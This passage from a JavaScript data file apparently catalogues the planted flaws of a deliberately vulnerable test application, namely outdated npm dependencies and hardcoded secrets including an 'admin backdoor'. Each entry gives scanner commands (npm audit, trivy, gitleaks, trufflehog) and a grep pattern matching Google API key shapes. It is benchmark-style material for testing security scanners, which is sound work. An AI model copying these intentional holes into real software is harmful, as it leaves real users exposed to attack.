docker run --rm -v "$PWD":/repo anchore/grype:latest dir:/repo/backend`,
    expected: 'A handful of known CVEs reported per dep.',
    detectedBy: { SCA: 'yes' },
  },
  {
    id: 'sca-frontend',
    title: 'Vulnerable npm dependencies',
    cwe: 'A06:2021',
    severity: 'High',
    category: 'Dependencies (SCA)',
    where: 'frontend/package.json',
    description:
      'axios 0.21.0 (SSRF), lodash 4.17.4 (prototype pollution), marked 0.3.6 (XSS), jquery 3.4.0, moment 2.18.1 (ReDoS), handlebars 4.0.5 (RCE), minimist 1.2.0, serialize-javascript 1.4.0.',
    payload: `cd frontend && npm audit
docker run --rm -v "$PWD":/repo aquasec/trivy:latest fs --scanners vuln /repo/frontend`,
    expected: 'Many high/critical CVEs reported per dep.',
    detectedBy: { SCA: 'yes' },
  },

  // ============================================================
  // SECRETS
  // ============================================================
  {
    id: 'secrets-backend',
    title: 'Hardcoded secrets in source (backend)',
    cwe: 'CWE-798',
    severity: 'Critical',
    category: 'Secrets',
    where: 'backend/secrets.go + docker-compose.yml',
    description:
      'AWS access key + secret, Stripe live secret, GitHub PAT, Slack webhook, Google API key, SendGrid, RSA private key, JWT secret, DB password, admin backdoor.',
    payload: `docker run --rm -v "$PWD":/repo zricethezav/gitleaks:latest detect -s /repo -v
docker run --rm -v "$PWD":/repo trufflesecurity/trufflehog:latest filesystem /repo`,
    expected: 'Both scanners report the embedded keys (key shapes match the standard rules).',
    detectedBy: { Secrets: 'yes', SAST: 'partial' },
  },
  {
    id: 'secrets-frontend',
    title: 'Hardcoded secrets in client bundle',
    cwe: 'CWE-798',
    severity: 'High',
    category: 'Secrets',
    where: 'frontend/.env + frontend/src/main.jsx',
    description:
      'VITE_GOOGLE_MAPS_API_KEY, VITE_SEGMENT_WRITE_KEY, and a telemetry token assigned to window. Anything in src/ ships to the browser.',
    payload: `# After "npm run build", inspect dist/assets/index-*.js — secrets are inlined.
grep -ao 'AIza[A-Za-z0-9_-]\\{30,\\}' frontend/dist/assets/*.js`,
    expected: 'Secrets show up in the bundle.',
    detectedBy: { Secrets: 'yes', AI: 'yes' },
  },
];
